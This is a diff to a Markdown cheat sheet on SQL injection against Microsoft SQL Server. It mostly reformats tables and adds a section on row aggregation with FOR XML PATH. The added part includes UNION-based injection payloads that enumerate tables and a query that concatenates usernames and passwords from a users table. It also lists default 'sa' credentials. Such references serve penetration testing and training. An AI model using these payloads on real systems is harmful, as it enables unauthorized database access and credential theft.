@@ -11,15 +11,15 @@ SELECT SERVERPROPERTY('productversion')
 
 ### Current Context
 
-| Query | Description |
-|-------|-------------|
-| `SELECT user` | Current user |
-| `SELECT system_user` | System user |
-| `SELECT user_name()` | User name |
-| `SELECT DB_NAME()` | Current database |
-| `SELECT @@SERVERNAME` | Server name |
-| `SELECT @@SERVICENAME` | Service name |
-| `SELECT loginame FROM master..sysprocesses WHERE spid=@@SPID` | Login name |
+| Query                                                         | Description      |
+| ------------------------------------------------------------- | ---------------- |
+| `SELECT user`                                                 | Current user     |
+| `SELECT system_user`                                          | System user      |
+| `SELECT user_name()`                                          | User name        |
+| `SELECT DB_NAME()`                                            | Current database |
+| `SELECT @@SERVERNAME`                                         | Server name      |
+| `SELECT @@SERVICENAME`                                        | Service name     |
+| `SELECT loginame FROM master..sysprocesses WHERE spid=@@SPID` | Login name       |
 
 ### Database Enumeration
 
@@ -57,18 +57,62 @@ SELECT name FROM master..syslogins WHERE sysadmin=1
 
 ## String Functions
 
-| Function | Example | Result |
-|----------|---------|--------|
-| Concat | `'a'+'b'` | `ab` |
-| `CONCAT` | `CONCAT('a','b')` | `ab` |
-| `SUBSTRING` | `SUBSTRING('hello',1,3)` | `hel` |
-| `LEFT` | `LEFT('hello',2)` | `he` |
-| `RIGHT` | `RIGHT('hello',2)` | `lo` |
-| `LEN` | `LEN('hello')` | `5` |
-| `ASCII` | `ASCII('A')` | `65` |
-| `CHAR` | `CHAR(65)` | `A` |
-| `NCHAR` | `NCHAR(65)` | `A` |
-| `UNICODE` | `UNICODE('A')` | `65` |
+| Function    | Example                  | Result |
+| ----------- | ------------------------ | ------ |
+| Concat      | `'a'+'b'`                | `ab`   |
+| `CONCAT`    | `CONCAT('a','b')`        | `ab`   |
+| `SUBSTRING` | `SUBSTRING('hello',1,3)` | `hel`  |
+| `LEFT`      | `LEFT('hello',2)`        | `he`   |
+| `RIGHT`     | `RIGHT('hello',2)`       | `lo`   |
+| `LEN`       | `LEN('hello')`           | `5`    |
+| `ASCII`     | `ASCII('A')`             | `65`   |
+| `CHAR`      | `CHAR(65)`               | `A`    |
+| `NCHAR`     | `NCHAR(65)`              | `A`    |
+| `UNICODE`   | `UNICODE('A')`           | `65`   |
+
+### String Aggregation (Concatenating Multiple Rows)
+
+**⚠️ Important:** `CONCAT()` only accepts **scalar values**, NOT subqueries that return multiple rows!
+
+#### ❌ WRONG - This will fail:
+
+```sql
+SELECT CONCAT((SELECT table_name FROM information_schema.tables))
+-- Error: Subquery returned more than 1 value
+```
+
+#### ✅ CORRECT - Use FOR XML PATH:
+
+```sql
+-- Method 1: FOR XML PATH('') - Recommended
+SELECT (SELECT table_name+',' FROM information_schema.tables FOR XML PATH(''))
+
+-- Method 2: FOR XML PATH(''), TYPE
+SELECT (SELECT table_name AS 'data()' FROM information_schema.tables FOR XML PATH(''))
+
+-- Method 3: STRING_AGG (MSSQL 2017+)
+SELECT STRING_AGG(table_name, ',') FROM information_schema.tables
+
+-- In UNION context:
+' UNION SELECT 1,(SELECT table_name+',' FROM information_schema.tables FOR XML PATH('')),3,4--
+' UNION SELECT 1,STRING_AGG(table_name,','),3,4 FROM information_schema.tables--
+```
+
+#### Common Use Cases:
+
+```sql
+-- List all databases
+SELECT (SELECT name+',' FROM master..sysdatabases FOR XML PATH(''))
+
+-- List all tables
+SELECT (SELECT table_name+',' FROM information_schema.tables FOR XML PATH(''))
+
+-- List all columns from a table
+SELECT (SELECT column_name+',' FROM information_schema.columns WHERE table_name='users' FOR XML PATH(''))
+
+-- Extract data from multiple rows
+SELECT (SELECT username+':'+password+'|' FROM users FOR XML PATH(''))
+```
 
 ## Comment Syntax
 
@@ -268,11 +312,11 @@ SELECT name,is_trustworthy_on FROM sys.databases WHERE is_trustworthy_on=1
 
 Common SQL Server instance defaults:
 
-| Instance | User | Password |
-|----------|------|----------|
-| Default | `sa` | `sa` or blank |
-| SQLEXPRESS | `sa` | varies |
-| Custom | `sa` | varies |
+| Instance   | User | Password      |
+| ---------- | ---- | ------------- |
+| Default    | `sa` | `sa` or blank |
+| SQLEXPRESS | `sa` | varies        |
+| Custom     | `sa` | varies        |
 
 ## Quick Payload Reference
 
